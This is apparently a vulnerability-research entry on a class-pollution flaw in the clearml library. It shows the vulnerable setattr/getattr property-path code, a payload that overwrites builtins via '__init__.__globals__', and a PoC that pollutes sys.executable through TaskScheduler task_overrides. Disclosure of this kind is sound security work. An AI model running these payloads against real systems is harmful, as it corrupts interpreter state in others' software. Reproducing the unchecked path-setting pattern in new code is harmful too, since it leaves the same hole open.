## clearml

### Meta

+ Library: clearml
+ Type: App
+ Stars: 5.7K
+ Version: v1.16.5
+ CVE: N/A
+ Status: Pending
+ Payload: ```clearml.automation.TaskScheduler.add_task(task_overrides={'__init__.__globals__.__builtins__.getattr': 'polluted'})```
+ Foundby: BlackPyrl
+ Report: Pending
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/allegroai/clearml.git

### Vulnerable Code Snippet

```
def _get_data_property(cls, prop_path, raise_on_error=True, log_on_error=True, default=None, data=None, log=None):
    obj = data
    props = prop_path.split('.')
    for i in range(len(props)):
        if not hasattr(obj, props[i]) and (not isinstance(obj, dict) or props[i] not in obj):
            msg = 'Task has no %s section defined' % '.'.join(props[:i + 1])
            if log_on_error and log:
                log.info(msg)
            if raise_on_error:
                raise ValueError(msg)
            return default

        if isinstance(obj, dict):
            obj = obj.get(props[i])
        else:
            obj = getattr(obj, props[i], None)

    return obj

def _set_task_property(self, prop_path, value, raise_on_error=True, log_on_error=True):
    props = prop_path.split('.')
    if len(props) > 1:
        obj = self._get_task_property(
            '.'.join(props[:-1]), raise_on_error=raise_on_error, log_on_error=log_on_error)
    else:
        obj = self.data
    if not hasattr(obj, props[-1]) and isinstance(obj, dict):
        obj[props[-1]] = value
    else:
        setattr(obj, props[-1], value)
```

### PoC

```
from clearml import Task
from clearml.automation import TaskScheduler
import sys

def check_pollution():
    with open('/home/redacted/Desktop/python-class-pollution/class-pollution/clearml/poc/polluted.txt', 'w') as f:
        f.write(sys.executable)

task = Task.init(project_name="class-pollution", task_name="poc")

scheduler = TaskScheduler()
scheduler.add_task(
    name='recurring pipeline',
    schedule_task_id=Task.get_task(project_name='class-pollution', task_name='poc'),
    schedule_function=check_pollution,
    queue='default',
    minute=1,
    recurring=False,
    execute_immediately=True,
    single_instance=True,
    task_overrides={
        '__class__.__init__.__globals__.six.sys.executable': 'polluted',
        # '__dict__._property_models.__class__.__init__.__globals__.six.sys.executable': 'polluted',
    }
)

scheduler.start()
```